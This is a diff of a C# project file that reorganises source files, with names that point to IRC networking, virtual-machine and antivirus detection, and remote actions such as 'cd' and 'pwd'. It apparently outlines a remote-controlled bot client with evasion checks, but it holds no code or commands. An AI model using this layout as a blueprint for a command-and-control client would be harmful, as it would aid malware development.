@@ -49,9 +49,16 @@
     <Compile Include="Network\HostAction.cs" />
     <Compile Include="Network\IRC\IrcClient.cs" />
     <Compile Include="Network\IRC\ConnectionFailedException.cs" />
-    <Compile Include="Windows\Detector.cs" />
-    <Compile Include="Windows\Internal\VMInfo.cs" />
-    <Compile Include="Windows\Internal\AVInfo.cs" />
+    <Compile Include="Network\IUpstream.cs" />
+    <Compile Include="Network\IrcUpstream.cs" />
+    <Compile Include="Internal\AVInfo.cs" />
+    <Compile Include="Internal\VMInfo.cs" />
+    <Compile Include="Detector.cs" />
+    <Compile Include="Network\NetworkManager.cs" />
+    <Compile Include="Actions\ActionPool.cs" />
+    <Compile Include="Actions\Predefined\ActionCd.cs" />
+    <Compile Include="ActionPoolExtensions.cs" />
+    <Compile Include="Actions\Predefined\ActionPwd.cs" />
   </ItemGroup>
   <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
   <ProjectExtensions>
@@ -70,7 +77,7 @@
     <Folder Include="Native\" />
     <Folder Include="Network\" />
     <Folder Include="Network\IRC\" />
-    <Folder Include="Windows\" />
-    <Folder Include="Windows\Internal\" />
+    <Folder Include="Actions\" />
+    <Folder Include="Actions\Predefined\" />
   </ItemGroup>
 </Project>
